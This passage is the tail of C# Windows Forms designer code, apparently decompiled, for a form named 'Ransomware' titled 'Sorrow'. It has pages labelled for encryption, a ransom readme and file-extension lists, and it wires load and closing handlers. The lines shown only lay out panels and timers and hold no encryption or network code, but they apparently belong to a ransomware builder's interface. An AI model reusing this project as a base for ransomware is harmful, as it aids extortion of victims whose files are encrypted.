        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 593);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(349, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 385);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(349, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(672, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 385);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.TimerCounFile.Tick += new System.EventHandler(TimerCounFile_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(706, 628);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Ransomware";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Sorrow";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Ransomware_FormClosing);
        base.Load += new System.EventHandler(Ransomware_Load);
        base.Shown += new System.EventHandler(Ransomware_Shown);
        this.panelForm.ResumeLayout(false);
        this.PageRNS.ResumeLayout(false);
        this.PageSettings.ResumeLayout(false);
        this.PageSettings.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListExtension).EndInit();
        this.ContectExtesion.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ImageBackground).EndInit();
        this.PageReadme.ResumeLayout(false);
        this.PageEncrypt.ResumeLayout(false);
        this.contextMenuStrip1.ResumeLayout(false);
        this.PaneControll.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
